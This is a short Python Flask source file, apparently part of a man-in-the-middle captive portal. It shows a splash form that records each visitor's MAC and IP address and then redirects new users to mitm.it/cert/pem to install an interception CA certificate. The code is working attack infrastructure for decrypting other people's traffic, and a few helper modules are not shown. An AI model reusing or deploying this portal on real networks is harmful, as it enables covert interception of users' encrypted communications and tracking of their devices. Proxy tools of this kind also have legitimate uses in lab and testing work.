import os

from mitm import app
from flask import jsonify, request, render_template, flash, redirect

from utilities import Network_Utils, Utils, Constants
from forms import SplashForm

if os.path.exists(Constants.USER_STORE_FILE) == False:
    with open(Constants.USER_STORE_FILE, 'w'):
        print("Created file")

@app.route("/test")
def test():
	data = Network_Utils.get_request_details(request)
	return jsonify({
		"message": "Test API working",
		"mac_address": data["mac"],
		"ip_address": data["ip"]
	})

@app.route("/", methods=['GET', 'POST'])
def home():
	form = SplashForm(request.form)
	print(request.headers.get("Custom"))
	if request.method == 'POST':
		if form.validate():
			params = Network_Utils.get_request_details(request)
			print(params)			
			if Utils.check_user_ip_exists(params):
				print("User already exits")
			else:
				print("Registered user")
				Utils.store_user_ip(params)
				return redirect('http://mitm.it/cert/pem')
		else:
			flash('Error: All the form fields are required. ')

	return render_template("form.html", form=form)
